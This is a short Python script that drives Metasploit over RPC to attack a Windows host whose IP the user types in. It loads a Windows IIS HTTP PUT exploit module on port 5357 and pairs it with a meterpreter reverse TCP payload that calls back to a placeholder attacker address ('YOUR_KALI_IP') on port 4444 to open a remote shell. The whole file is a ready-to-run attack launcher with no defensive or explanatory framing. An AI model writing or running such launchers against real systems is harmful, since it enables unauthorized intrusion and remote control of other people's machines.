# metasploit_launcher.py

from metasploit.msfrpc import MsfRpcClient

def launch_exploit(target_ip):
    client = MsfRpcClient('password', server='127.0.0.1', ssl=False)
    
    # Load exploit module
    exploit = client.modules.use('exploit', 'windows/iis/http_put')
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 5357
    exploit['SSL'] = False

    # Payload to get shell
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = 'YOUR_KALI_IP'  # Replace with your IP
    payload['LPORT'] = 4444

    # Execute exploit
    job_id = exploit.execute(payload=payload)
    print(f"🚀 Exploit launched! Job ID: {job_id['job_id']}")

if __name__ == '__main__':
    target = input("🎯 Enter target IP: ")
    launch_exploit(target)

